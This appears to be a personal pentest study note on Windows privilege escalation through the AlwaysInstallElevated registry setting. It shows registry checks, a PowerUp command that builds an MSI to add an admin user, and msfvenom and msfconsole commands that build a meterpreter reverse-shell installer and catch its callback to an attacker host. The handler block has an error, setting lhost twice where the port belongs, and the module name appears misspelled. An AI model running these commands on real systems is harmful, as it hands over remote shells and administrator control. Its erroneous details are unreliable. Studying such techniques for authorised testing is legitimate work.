Query the registry:
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
![[Pasted image 20240420092928.png]]

Query the registry:
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
![[Pasted image 20240420093119.png]]

If *AlwaysInstallElevated* is set to 0x1 on both queries we can exploit this.

# Exploit method 1

*PowerUp* (from note 01) printed the command on how to exploit it: `Write-UserAddMSI`
This will create a new MSI-installer file in the directory which we can execute to create a new user with administrative privs.

# Exploit method 2

Create a reverse tcp shell with *msfvenom* as an MSI-installer file:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker-ip> lport=<attacker-port> -f msi -o revshell.msi
```

Start multi handler in *msfconsole* to catch the shell:
```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <attacker-ip>
set lhost <attacker-port>
run
```

Upload the MSI file to the target machine and execute it to pop a shell.

# Exploit method 3

If you already have a meterpreter session open you can also use the module:
**exploit/windows/local/always_installed_elevated**
